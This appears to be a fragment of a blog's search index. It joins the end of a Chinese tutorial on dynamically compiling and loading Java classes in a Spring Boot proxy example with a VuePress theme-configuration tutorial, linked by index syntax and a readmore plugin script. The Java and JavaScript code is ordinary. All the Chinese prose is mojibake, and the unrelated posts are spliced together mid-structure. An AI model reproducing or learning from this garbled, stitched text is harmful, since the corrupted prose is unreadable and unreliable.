123456789101112131415161718192021222324package com.clay;import com.clay.loader.ProxyUtil;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @author clay */@SpringBootApplicationpublic class ProxyApplication { public static void main(String[] args) { SpringApplication.run(ProxyApplication.class, args); try { ProxyUtil util = new ProxyUtil(); util.handle(); } catch (Exception e) { e.printStackTrace(); } }} ç¨‹åºè¿è¡Œç»“æœ12invoke dealer sell methodinvoke supermarket sell method å¸¸è§é—®é¢˜åŠ¨æ€ç¼–è¯‘æ—¶æ‰¾ä¸åˆ°ç¬¬ä¸‰æ–¹åŒ…çš„ç±»åŠ¨æ€ç¼–è¯‘ Java æ–‡ä»¶æ—¶ï¼Œå¦‚æœè¿™ä¸ª Java æ–‡ä»¶å¼•ç”¨äº†ç¬¬ä¸‰æ–¹ Jar åŒ…é‡Œçš„ç±»ï¼Œé‚£ä¹ˆç¨‹åºè¿è¡Œåœ¨ IDE å·¥å…·æ—¶ï¼Œåˆ™å¯ä»¥æ­£å¸¸åŠ¨æ€ç¼–è¯‘ã€‚å¦‚æœç¨‹åºå•ç‹¬è¿è¡Œåœ¨ Web å®¹å™¨ï¼ˆä¾‹å¦‚ Tomcatï¼‰ï¼Œåˆæˆ–è€…æ˜¯ç›´æ¥é€šè¿‡ java -jar xxx.jar çš„å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œï¼Œé‚£ä¹ˆæ‰§è¡ŒåŠ¨æ€ç¼–è¯‘æ—¶ï¼Œå¾€å¾€å°±ä¼šæç¤ºæ‰¾ä¸åˆ°ç¬¬ä¸‰æ–¹ Jar åŒ…é‡Œçš„ Class æˆ–è€… Packageï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸ç¼–è¯‘ç”Ÿæˆ Class æ–‡ä»¶æˆ–è€…å­—èŠ‚ç ã€‚ è§£å†³æ–¹æ¡ˆï¼š æ–¹æ³•ä¸€ï¼šå°†æ‰€ä¾èµ–åˆ°çš„ç¬¬ä¸‰æ–¹ Jar æ–‡ä»¶ï¼Œå¤åˆ¶åˆ° %JAVA_HOME%\\jre\\lib\\ext ç›®å½•ä¸‹ï¼Œç„¶åå†é‡å¯ Web å®¹å™¨ï¼ˆTomcatï¼‰æˆ–è€…åº”ç”¨ï¼Œæ­¤æ–¹æ³•ä¸ä¸€å®šå…¼å®¹æ‰€æœ‰ JDK ç‰ˆæœ¬ï¼Œä¸”æœªç»éªŒè¯æ˜¯å¦æœ‰æ•ˆ æ–¹æ³•äºŒï¼šæ‰§è¡ŒåŠ¨æ€ç¼–è¯‘æ—¶ï¼Œæ·»åŠ  -classpath å‚æ•°æ¥æŒ‡å®šç¬¬ä¸‰æ–¹ Jar åŒ…çš„ç»å¯¹è·¯å¾„ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678String jars = "/root/.m2/repository/com/clay/proxy/1.0.0/proxy-1.0.0.jar";Iterable&lt;String&gt; options = Arrays.asList("-encoding", "UTF-8", "-classpath", jars);JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();StandardJavaFileManager fileMgr = compiler.getStandardFileManager(null, null, null);Iterable units = fileMgr.getJavaFileObjects(fileName);JavaCompiler.CompilationTask task = compiler.getTask(null, fileMgr, null, options, null, units);result = task.call(); SpringBoot æ‰¾ä¸åˆ°åŠ¨æ€ç¼–è¯‘åçš„ç±»åœ¨ SpringBoot åº”ç”¨å†…æ‰§è¡ŒåŠ¨æ€ç¼–è¯‘æ—¶ï¼Œå¯ä»¥æ­£å¸¸ç”Ÿæˆ Class æ–‡ä»¶ï¼Œä½†å¾€å¾€æ— æ³•ç›´æ¥é€šè¿‡ URLClassLoader ç±»åŠ è½½ Class æ–‡ä»¶æ¥å®ä¾‹åŒ– Java å¯¹è±¡ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package com.clay.loader;import javax.tools.JavaCompiler;import javax.tools.JavaCompiler.CompilationTask;import javax.tools.StandardJavaFileManager;import javax.tools.ToolProvider;import java.io.File;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Constructor;import java.net.URL;import java.net.URLClassLoader;public class ProxyUtil { /** * ç”Ÿæˆæ–‡ä»¶ * * @param path * @return content */ public boolean createFile(String path, String content) { FileWriter fw = null; try { String parentPath = path.substring(0, path.lastIndexOf("/")); File parentFile = new File(parentPath); if (!parentFile.exists()) { parentFile.mkdirs(); } File javaFile = new File(path); if (!javaFile.exists()) { javaFile.createNewFile(); } fw = new FileWriter(javaFile); fw.write(content); fw.flush(); return true; } catch (Exception e) { e.printStackTrace(); } finally { if (fw != null) { try { fw.close(); } catch (IOException e) { e.printStackTrace(); } } } return false; } /** * åŠ¨æ€ç¼–è¯‘ * * @throws Exception */ public void handle() throws Exception { String rt = "\\r\\n"; String outputDir = "/tmp/jdk/compile/"; // è¿™é‡Œå®šä¹‰çš„Javaç±»ä»£ç é‡Œï¼Œå»ºè®®é¦–è¡Œä¸è¦å¸¦åŒ…åï¼Œå¦åˆ™å®¹æ˜“å‡ºç°ç¼–è¯‘å¤±è´¥çš„é—®é¢˜ String source = "import com.clay.domain.Store;" + rt + "public class Dealer implements Store" + rt + "{" + rt + "private Store s;" + rt + "public Dealer(Store s)" + rt + " {" + " this.s = s;" + rt + " }" + rt + "@Override" + rt + "public void sell()" + " {" + rt + "System.out.println(\\"call dealer sell method\\");" + rt + "s.sell();" + rt + " }" + rt + "}"; // Javaæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ String javaPath = outputDir + "Dealer.java"; System.out.println("===&gt; java file path: " + javaPath); // ç”ŸæˆJavaæ–‡ä»¶ createFile(javaPath, source); // ç¼–è¯‘Javaæ–‡ä»¶ JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager fileMgr = compiler.getStandardFileManager(null, null, null); Iterable units = fileMgr.getJavaFileObjects(javaPath); CompilationTask task = compiler.getTask(null, fileMgr, null, null, null, units); boolean result = task.call(); fileMgr.close(); System.out.println("===&gt; compile result: " + result); String classPath = "file:/" + outputDir; System.out.println("===&gt; class file path: " + classPath); // åŠ è½½Classæ–‡ä»¶ URL[] urls = new URL[]{new URL(classPath)}; URLClassLoader ul = new URLClassLoader(urls); Class clazz = ul.loadClass("Dealer"); // å®ä¾‹åŒ– Constructor ctr = clazz.getConstructor(Store.class); Store s = (Store) ctr.newInstance(new Supermarket()); s.sell(); }} ç‰¹åˆ«æ³¨æ„ï¼šåœ¨ SpringBoot åº”ç”¨å†…æ— æ³•æ­£å¸¸è¿è¡Œä¸Šè¿°ä»£ç ï¼Œå³è°ƒç”¨ loadClass () æ–¹æ³•çš„æ—¶å€™ä¼šæŠ›å‡ºå¼‚å¸¸ â€œjava.lang.ClassNotFoundException: Dealerâ€ æ­¤æ—¶å¯ä»¥å°è¯•ä½¿ç”¨ Thread.currentThread().getContextClassLoader() æ¥æ›¿ä»£ new URLClassLoader(urls)ï¼Œå…·ä½“çš„å®ç°ä»£ç å¯å‚è€ƒå¼€æºé¡¹ç›® dynamic-loaderï¼Œè¿™é‡Œä¸å†ç´¯è¿° å¼€æºé¡¹ç›® varcode dynamic-java-compiler dynamic-loaderï¼ˆæ¨èï¼‰ å‚è€ƒåšå®¢ åŠ¨æ€ä»£ç† - åŠ¨æ€ç”Ÿæˆ Java æ–‡ä»¶å¹¶ç¼–è¯‘æˆ Class æ–‡ä»¶ Java å¼•å…¥ import å…¶å®ƒç›®å½•çš„è‡ªå®šä¹‰åŒ…æˆ– Java æºæ–‡ä»¶ å°† Java å­—ç¬¦ä¸²å½¢å¼çš„æºä»£ç åŠ¨æ€ç¼–è¯‘ï¼Œç”Ÿæˆ Class æ–‡ä»¶å¹¶æ‰§è¡Œ Java åŠ¨æ€ç¼–è¯‘æ•´ä¸ªé¡¹ç›®ï¼Œè§£å†³ Jar åŒ…æ‰¾ä¸åˆ°çš„é—®é¢˜ Java Web é¡¹ç›®éƒ¨ç½²åï¼ŒåŠ¨æ€ç¼–è¯‘æ— æ³•æ‰¾åˆ°ä¾èµ–çš„ Jar åŒ… Java Web é¡¹ç›®éƒ¨ç½²åˆ° Tomcat åï¼Œä½¿ç”¨åŠ¨æ€ç¼–è¯‘æ— æ³•æ‰¾åˆ°ç›¸å…³ç±»çš„è§£å†³æ–¹æ¡ˆ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"VuePress å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ä¸»é¢˜ç¯‡",url:"/posts/cf4f7150.html",text:"å‰è¨€VuePress ä¸Šç¯‡ VuePress å…¥é—¨æ•™ç¨‹ä¹‹äºŒ Markdown ç¯‡ VuePress ç«™ç‚¹ Vuepress ä¸»é¢˜ä»‹ç» VuePress å®˜æ–¹æ–‡æ¡£ VuePress ä¸­æ–‡æ–‡æ¡£ VuePress Github é¡¹ç›® ä½¿ç”¨ä¸»é¢˜ä½¿ç”¨ä¸€ä¸ªä¸»é¢˜å’Œä½¿ç”¨ä¸€ä¸ªæ’ä»¶çš„æ–¹å¼å‡ ä¹ä¸€è‡´ã€‚ ä½¿ç”¨æ¥è‡ªä¾èµ–çš„ä¸»é¢˜ä¸€ä¸ªä¸»é¢˜å¯ä»¥åœ¨ä»¥ vuepress-theme-xxx çš„å½¢å¼å‘å¸ƒåˆ° NPMï¼Œä½ å¯ä»¥è¿™æ ·ä½¿ç”¨å®ƒï¼š 1234// .vuepress/config.jsmodule.exports = { theme: 'vuepress-theme-xx'} ä¸»é¢˜çš„ç¼©å†™å¦‚æœä½ çš„ä¸»é¢˜åä»¥ vuepress-theme- å¼€å¤´ï¼Œä½ å¯ä»¥ä½¿ç”¨ç¼©å†™æ¥çœç•¥è¿™ä¸ªå‰ç¼€ï¼š 1234// .vuepress/config.jsmodule.exports = { theme: 'xxx'} å’Œä¸‹é¢ç­‰ä»·ï¼š 1234// .vuepress/config.jsmodule.exports = { theme: 'vuepress-theme-xxx'} è¿™ä¹Ÿé€‚ç”¨äº Scoped Packages: 1234// .vuepress/config.jsmodule.exports = { theme: '@org/vuepress-theme-xxx', // æˆ–è€…ä¸€ä¸ªå®˜æ–¹ä¸»é¢˜: '@vuepress/theme-xxx'} ç¼©å†™: 1234// .vuepress/config.jsmodule.exports = { theme: '@org/xxx', // æˆ–è€…ä¸€ä¸ªå®˜æ–¹ä¸»é¢˜: '@vuepress/xxx'} æç¤ºï¼šä»¥ @vuepress/theme- å¼€å¤´çš„ä¸»é¢˜æ˜¯å®˜æ–¹ç»´æŠ¤çš„ä¸»é¢˜ ä¸»é¢˜çš„é€šç”¨é…ç½®å’Œæ’ä»¶å‡ ä¹ä¸€æ ·ï¼Œä¸»é¢˜çš„é…ç½®æ–‡ä»¶ themeEntry åº”è¯¥å¯¼å‡ºä¸€ä¸ªæ™®é€šçš„ JavaScript å¯¹è±¡ï¼ˆ#1ï¼‰ï¼Œå®ƒä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè¿”å›å¯¹è±¡çš„å‡½æ•°ï¼ˆ#2ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°æ¥å—ç”¨æˆ·åœ¨ siteConfig.themeConfig ä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€åŒ…å«ç¼–è¯‘æœŸä¸Šä¸‹æ–‡çš„ ctx å¯¹è±¡ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚ 12345// .vuepress/theme/index.js// #1module.exports = { // ...} 1234567// .vuepress/theme/index.js// #2module.exports = (themeConfig, ctx) =&gt; { return { // ... }} æç¤ºï¼š ä½ åº”è¯¥èƒ½çœ‹åˆ° themeEntry å’Œ themeConfig çš„åŒºåˆ«ï¼Œå‰è€…æ˜¯ä¸€ä¸ªä¸»é¢˜æœ¬èº«çš„é…ç½®ï¼Œè¿™äº›é…ç½®ç”± VuePress æœ¬èº«æä¾›ï¼›è€Œåè€…åˆ™æ˜¯ç”¨æˆ·å¯¹ä¸»é¢˜çš„é…ç½®ï¼Œè¿™äº›é…ç½®é€‰é¡¹åˆ™ç”±å½“å‰ä½¿ç”¨çš„ä¸»é¢˜æ¥å®ç°ï¼Œå¦‚ é»˜è®¤ä¸»é¢˜é…ç½®ã€‚ é™¤äº†æœ¬èŠ‚åˆ—å‡ºçš„é€‰é¡¹ï¼ŒthemeEntry ä¹Ÿæ”¯æŒæ’ä»¶æ”¯æŒçš„æ‰€æœ‰ é…ç½®é€‰é¡¹ å’Œ ç”Ÿå‘½å‘¨æœŸã€‚ plugins ç±»å‹: Array|Object é»˜è®¤å€¼: undefined å‚è€ƒ: æ’ä»¶ &gt; ä½¿ç”¨æ’ä»¶ Warning æ³¨æ„ï¼šä½ ä¸€èˆ¬å¯èƒ½ä¸éœ€è¦ä½¿ç”¨ä¸‹é¢çš„è¿™äº›é…ç½®é€‰é¡¹ï¼Œé™¤éä½ çŸ¥é“ä½ åœ¨åšä»€ä¹ˆï¼ devTemplate ç±»å‹: String é»˜è®¤å€¼: undefined dev æ¨¡å¼ä¸‹ä½¿ç”¨çš„ HTML æ¨¡æ¿è·¯å¾„ï¼Œé»˜è®¤æ¨¡æ¿è§ è¿™é‡Œã€‚ ssrTemplate ç±»å‹: String é»˜è®¤å€¼: undefined build æ¨¡å¼ä¸‹ä½¿ç”¨çš„ HTML æ¨¡æ¿è·¯å¾„ï¼Œé»˜è®¤æ¨¡æ¿è§ è¿™é‡Œã€‚ å‚è€ƒ: Vue SSR Guide &gt; template. extend ç±»å‹: String é»˜è®¤å€¼: undefined 1234// .vuepress/theme/index.jsmodule.exports = { extend: '@vuepress/theme-default'} VuePress æ”¯æŒä¸€ä¸ªä¸»é¢˜ç»§æ‰¿äºå¦ä¸€ä¸ªä¸»é¢˜ã€‚VuePress å°†éµå¾ª override çš„ç†å¿µè‡ªåŠ¨å¸®ä½ è§£å†³å„ç§ä¸»é¢˜å±æ€§ï¼ˆå¦‚æ ·å¼ã€å¸ƒå±€ç»„ä»¶ï¼‰çš„ä¼˜å…ˆçº§ã€‚ å‚è€ƒ: ä¸»é¢˜ç»§æ‰¿ ä¾‹å­: @vuepress/theme-vue globalLayout ç±»å‹: String é»˜è®¤å€¼: undefined 1234// .vuepress/theme/index.jsmodule.exports = { globalLayout: '/path/to/your/global/vue/sfc'} å…¨å±€å¸ƒå±€ç»„ä»¶æ˜¯è´Ÿè´£ç®¡ç†å…¨å±€å¸ƒå±€æ–¹æ¡ˆçš„ä¸€ä¸ªç»„ä»¶ï¼ŒVuePress é»˜è®¤çš„ globalLayout ä¼šå¸®ä½ æ ¹æ® $frontmatter.layout æ¥æ¸²æŸ“ä¸åŒçš„å¸ƒå±€ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä½ ä¸è¦é…ç½®æ­¤é€‰é¡¹ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå½“ä½ æƒ³ä¸ºå½“å‰ä¸»é¢˜è®¾ç½®å…¨å±€çš„ header å’Œ footer æ—¶ï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š 12345678910111213141516171819202122232425&lt;!-- .vuepress/theme/layouts/GlobalLayout.vue --&gt;&lt;template&gt; &lt;div id=\"global-layout\"&gt; &lt;header&gt;&lt;h1&gt;Header&lt;/h1&gt;&lt;/header&gt; &lt;component :is=\"layout\"/&gt; &lt;footer&gt;&lt;h1&gt;Footer&lt;/h1&gt;&lt;/footer&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { computed: { layout () { if (this.$page.path) { if (this.$frontmatter.layout) { // ä½ ä¹Ÿå¯ä»¥åƒé»˜è®¤çš„ globalLayout ä¸€æ ·é¦–å…ˆæ£€æµ‹ layout æ˜¯å¦å­˜åœ¨ return this.$frontmatter.layout } return 'Layout' } return 'NotFound' } }}&lt;/script&gt; é»˜è®¤ä¸»é¢˜çš„é…ç½®ä¸‹è¿°æ‰€åˆ—çš„é€‰é¡¹ä»…å¯¹ VuePress çš„é»˜è®¤ä¸»é¢˜ç”Ÿæ•ˆï¼Œå¦‚æœä½ åœ¨ä½¿ç”¨ä¸€ä¸ªè‡ªå®šä¹‰ä¸»é¢˜ï¼Œé€‰é¡¹å¯èƒ½ä¼šæœ‰ä¸åŒã€‚ é¦–é¡µé»˜è®¤çš„ä¸»é¢˜æä¾›äº†ä¸€ä¸ªé¦–é¡µï¼ˆHomepageï¼‰çš„å¸ƒå±€ (ç”¨äº è¿™ä¸ªç½‘ç«™çš„ä¸»é¡µ)ã€‚æƒ³è¦ä½¿ç”¨å®ƒï¼Œéœ€è¦åœ¨ä½ çš„æ ¹çº§ README.md çš„ YAML Front Matter æŒ‡å®š home: trueã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªå¦‚ä½•ä½¿ç”¨çš„ä¾‹å­ï¼š 12345678910111213141516---home: trueheroImage: /hero.pngheroText: Hero æ ‡é¢˜tagline: Hero å‰¯æ ‡é¢˜actionText: å¿«é€Ÿä¸Šæ‰‹ â†’actionLink: /zh/guide/features:- title: ç®€æ´è‡³ä¸Š details: ä»¥ Markdown ä¸ºä¸­å¿ƒçš„é¡¹ç›®ç»“æ„ï¼Œä»¥æœ€å°‘çš„é…ç½®å¸®åŠ©ä½ ä¸“æ³¨äºå†™ä½œã€‚- title: Vueé©±åŠ¨ details: äº«å— Vue + webpack çš„å¼€å‘ä½“éªŒï¼Œåœ¨ Markdown ä¸­ä½¿ç”¨ Vue ç»„ä»¶ï¼ŒåŒæ—¶å¯ä»¥ä½¿ç”¨ Vue æ¥å¼€å‘è‡ªå®šä¹‰ä¸»é¢˜ã€‚- title: é«˜æ€§èƒ½ details: VuePress ä¸ºæ¯ä¸ªé¡µé¢é¢„æ¸²æŸ“ç”Ÿæˆé™æ€çš„ HTMLï¼ŒåŒæ—¶åœ¨é¡µé¢è¢«åŠ è½½çš„æ—¶å€™ï¼Œå°†ä½œä¸º SPA è¿è¡Œã€‚footer: MIT Licensed | Copyright Â© 2018-present Evan You--- ä½ å¯ä»¥å°†ç›¸åº”çš„å†…å®¹è®¾ç½®ä¸º null æ¥ç¦ç”¨æ ‡é¢˜å’Œå‰¯æ ‡é¢˜ï¼Œä»»ä½• YAML Front Matter ä¹‹åé¢å¤–çš„å†…å®¹å°†ä¼šä»¥æ™®é€šçš„ Markdown è¢«æ¸²æŸ“ï¼Œå¹¶æ’å…¥åˆ° features çš„åé¢ã€‚ å¯¼èˆªæ å¯¼èˆªæ å¯èƒ½åŒ…å«ä½ çš„é¡µé¢æ ‡é¢˜ã€å¤šè¯­è¨€åˆ‡æ¢ã€æœç´¢æ¡†ã€ å¯¼èˆªæ é“¾æ¥ã€ä»“åº“é“¾æ¥ï¼Œå®ƒä»¬å‡å–å†³äºä½ çš„é…ç½®ã€‚ å¯¼èˆªæ  Logoä½ å¯ä»¥é€šè¿‡ themeConfig.logo å¢åŠ å¯¼èˆªæ  Logo ï¼ŒLogo å¯ä»¥è¢«æ”¾ç½®åœ¨å…¬å…±æ–‡ä»¶ç›®å½•ï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { logo: '/assets/img/logo.png', }} å¯¼èˆªæ é“¾æ¥ä½ å¯ä»¥é€šè¿‡ themeConfig.nav å¢åŠ ä¸€äº›å¯¼èˆªæ é“¾æ¥: 12345678910// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Home', link: '/' }, { text: 'Guide', link: '/guide/' }, { text: 'External', link: 'https://google.com' }, ] }} å¤–éƒ¨é“¾æ¥ &lt;a&gt; æ ‡ç­¾çš„ç‰¹æ€§å°†é»˜è®¤åŒ…å« target=\"_blank\" rel=\"noopener noreferrer\"ï¼Œä½ å¯ä»¥æä¾› target ä¸ relï¼Œå®ƒä»¬å°†è¢«ä½œä¸ºç‰¹æ€§è¢«å¢åŠ åˆ° &lt;a&gt; æ ‡ç­¾ä¸Šï¼š 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'External', link: 'https://google.com', target:'_self', rel:'' }, { text: 'Guide', link: '/guide/', target:'_blank' } ] }} å½“ä½ æä¾›äº†ä¸€ä¸ª items æ•°ç»„è€Œä¸æ˜¯ä¸€ä¸ªå•ä¸€çš„ link æ—¶ï¼Œå®ƒå°†æ˜¾ç¤ºä¸ºä¸€ä¸ª ä¸‹æ‹‰åˆ—è¡¨ ï¼š 123456789101112131415// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Languages', ariaLabel: 'Language Menu', items: [ { text: 'Chinese', link: '/language/chinese/' }, { text: 'Japanese', link: '/language/japanese/' } ] } ] }} æ­¤å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡åµŒå¥—çš„ items æ¥åœ¨ ä¸‹æ‹‰åˆ—è¡¨ ä¸­è®¾ç½®åˆ†ç»„ï¼š 1234567891011121314// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Languages', items: [ { text: 'Group1', items: [/* */] }, { text: 'Group2', items: [/* */] } ] } ] }} ç¦ç”¨å¯¼èˆªæ ä½ å¯ä»¥ä½¿ç”¨ themeConfig.navbar æ¥ç¦ç”¨æ‰€æœ‰é¡µé¢çš„å¯¼èˆªæ ï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { navbar: false }} ä½ ä¹Ÿå¯ä»¥é€šè¿‡ YAML Front Matter æ¥ç¦ç”¨æŸä¸ªæŒ‡å®šé¡µé¢çš„å¯¼èˆªæ ï¼š 123---navbar: false--- ä¾§è¾¹æ æƒ³è¦ä½¿ ä¾§è¾¹æ ï¼ˆSidebarï¼‰ç”Ÿæ•ˆï¼Œéœ€è¦é…ç½® themeConfig.sidebarï¼ŒåŸºæœ¬çš„é…ç½®ï¼Œéœ€è¦ä¸€ä¸ªåŒ…å«äº†å¤šä¸ªé“¾æ¥çš„æ•°ç»„ï¼š 12345678910// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: [ '/', '/page-a', ['/page-b', 'Explicit link text'] ] }} ä½ å¯ä»¥çœç•¥ .md æ‹“å±•åï¼ŒåŒæ—¶ä»¥ / ç»“å°¾çš„è·¯å¾„å°†ä¼šè¢«è§†ä¸º */README.mdï¼Œè¿™ä¸ªé“¾æ¥çš„æ–‡å­—å°†ä¼šè¢«è‡ªåŠ¨è·å–åˆ°ï¼ˆæ— è®ºä½ æ˜¯å£°æ˜ä¸ºé¡µé¢çš„ç¬¬ä¸€ä¸ª headerï¼Œè¿˜æ˜¯æ˜ç¡®åœ°åœ¨ YAML Front Matter ä¸­æŒ‡å®šé¡µé¢çš„æ ‡é¢˜ï¼‰ã€‚å¦‚æœä½ æƒ³è¦æ˜¾ç¤ºåœ°æŒ‡å®šé“¾æ¥çš„æ–‡å­—ï¼Œä½¿ç”¨ä¸€ä¸ªæ ¼å¼ä¸º [link, text] çš„æ•°ç»„ã€‚ åµŒå¥—çš„æ ‡é¢˜é“¾æ¥é»˜è®¤æƒ…å†µä¸‹ï¼Œä¾§è¾¹æ ä¼šè‡ªåŠ¨åœ°æ˜¾ç¤ºç”±å½“å‰é¡µé¢çš„æ ‡é¢˜ï¼ˆheadersï¼‰ç»„æˆçš„é“¾æ¥ï¼Œå¹¶æŒ‰ç…§é¡µé¢æœ¬èº«çš„ç»“æ„è¿›è¡ŒåµŒå¥—ï¼Œä½ å¯ä»¥é€šè¿‡ themeConfig.sidebarDepth æ¥ä¿®æ”¹å®ƒçš„è¡Œä¸ºã€‚é»˜è®¤çš„æ·±åº¦æ˜¯ 1ï¼Œå®ƒå°†æå–åˆ° h2 çš„æ ‡é¢˜ï¼Œè®¾ç½®æˆ 0 å°†ä¼šç¦ç”¨æ ‡é¢˜ï¼ˆheadersï¼‰é“¾æ¥ï¼ŒåŒæ—¶ï¼Œæœ€å¤§çš„æ·±åº¦ä¸º 2ï¼Œå®ƒå°†åŒæ—¶æå– h2 å’Œ h3 æ ‡é¢˜ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨ YAML Front Matter æ¥ä¸ºæŸä¸ªé¡µé¢é‡å†™æ­¤å€¼ï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼‰ï¼š 123---sidebarDepth: 2--- æ˜¾ç¤ºæ‰€æœ‰é¡µé¢çš„æ ‡é¢˜é“¾æ¥é»˜è®¤æƒ…å†µä¸‹ï¼Œä¾§è¾¹æ åªä¼šæ˜¾ç¤ºç”±å½“å‰æ´»åŠ¨é¡µé¢çš„æ ‡é¢˜ï¼ˆheadersï¼‰ç»„æˆçš„é“¾æ¥ï¼Œä½ å¯ä»¥å°† themeConfig.displayAllHeaders è®¾ç½®ä¸º true æ¥æ˜¾ç¤ºæ‰€æœ‰é¡µé¢çš„æ ‡é¢˜é“¾æ¥ï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { displayAllHeaders: true // é»˜è®¤å€¼ï¼šfalse }} æ´»åŠ¨çš„æ ‡é¢˜é“¾æ¥é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ç”¨æˆ·é€šè¿‡æ»šåŠ¨æŸ¥çœ‹é¡µé¢çš„ä¸åŒéƒ¨åˆ†æ—¶ï¼ŒåµŒå¥—çš„æ ‡é¢˜é“¾æ¥å’Œ URL ä¸­çš„ Hash å€¼ä¼šå®æ—¶æ›´æ–°ï¼Œè¿™ä¸ªè¡Œä¸ºå¯ä»¥é€šè¿‡ä»¥ä¸‹çš„é…ç½®æ¥ç¦ç”¨ï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { activeHeaderLinks: false, // é»˜è®¤å€¼ï¼štrue }} å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå½“ä½ ç¦ç”¨æ­¤é€‰é¡¹æ—¶ï¼Œæ­¤åŠŸèƒ½çš„ç›¸åº”è„šæœ¬å°†ä¸ä¼šè¢«åŠ è½½ï¼Œè¿™æ˜¯æˆ‘ä»¬æ€§èƒ½ä¼˜åŒ–çš„ä¸€ä¸ªå°ç‚¹ ä¾§è¾¹æ åˆ†ç»„ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨å¯¹è±¡æ¥å°†ä¾§è¾¹æ åˆ’åˆ†æˆå¤šä¸ªç»„ï¼š 123456789101112131415161718192021// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: [ { title: 'Group 1', // å¿…è¦çš„ path: '/foo/', // å¯é€‰çš„, æ ‡é¢˜çš„è·³è½¬é“¾æ¥ï¼Œåº”ä¸ºç»å¯¹è·¯å¾„ä¸”å¿…é¡»å­˜åœ¨ collapsable: false, // å¯é€‰çš„, é»˜è®¤å€¼æ˜¯ true, sidebarDepth: 1, // å¯é€‰çš„, é»˜è®¤å€¼æ˜¯ 1 children: [ '/' ] }, { title: 'Group 2', children: [ /* ... */ ], initialOpenGroupIndex: -1 // å¯é€‰çš„, é»˜è®¤å€¼æ˜¯ 0 } ] }} ä¾§è¾¹æ çš„æ¯ä¸ªå­ç»„é»˜è®¤æ˜¯å¯æŠ˜å çš„ï¼Œä½ å¯ä»¥è®¾ç½® collapsable: false æ¥è®©ä¸€ä¸ªç»„æ°¸è¿œéƒ½æ˜¯å±•å¼€çŠ¶æ€ã€‚ä¸€ä¸ªä¾§è¾¹æ çš„å­ç»„é…ç½®åŒæ—¶æ”¯æŒ sidebarDepth å­—æ®µç”¨äºé‡å†™é»˜è®¤æ˜¾ç¤ºçš„ä¾§è¾¹æ æ·±åº¦ (1)ã€‚ åµŒå¥—çš„ä¾§è¾¹æ åˆ†ç»„ä¹Ÿæ˜¯æ”¯æŒçš„ å¤šä¸ªä¾§è¾¹æ å¦‚æœä½ æƒ³ä¸ºä¸åŒçš„é¡µé¢ç»„æ¥æ˜¾ç¤ºä¸åŒçš„ä¾§è¾¹æ ï¼Œé¦–å…ˆï¼Œå°†ä½ çš„é¡µé¢æ–‡ä»¶ç»„ç»‡æˆä¸‹è¿°çš„ç›®å½•ç»“æ„ï¼š 123456789101112.â”œâ”€ README.mdâ”œâ”€ contact.mdâ”œâ”€ about.mdâ”œâ”€ foo/â”‚&nbsp;&nbsp;â”œâ”€ README.mdâ”‚ â”œâ”€ one.mdâ”‚ â””â”€ two.mdâ””â”€ bar/ â”œâ”€ README.md â”œâ”€ three.md â””â”€ four.md æ¥ç€ï¼Œéµå¾ªä»¥ä¸‹çš„ä¾§è¾¹æ é…ç½®ï¼š 12345678910111213141516171819202122232425// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: { '/foo/': [ '', /* /foo/ */ 'one', /* /foo/one.html */ 'two' /* /foo/two.html */ ], '/bar/': [ '', /* /bar/ */ 'three', /* /bar/three.html */ 'four' /* /bar/four.html */ ], // fallback '/': [ '', /* / */ 'contact', /* /contact.html */ 'about' /* /about.html */ ] } }} æ³¨æ„ï¼šç¡®ä¿ fallback ä¾§è¾¹æ è¢«æœ€åå®šä¹‰ï¼ŒVuePress ä¼šæŒ‰é¡ºåºéå†ä¾§è¾¹æ é…ç½®æ¥å¯»æ‰¾åŒ¹é…çš„é…ç½® 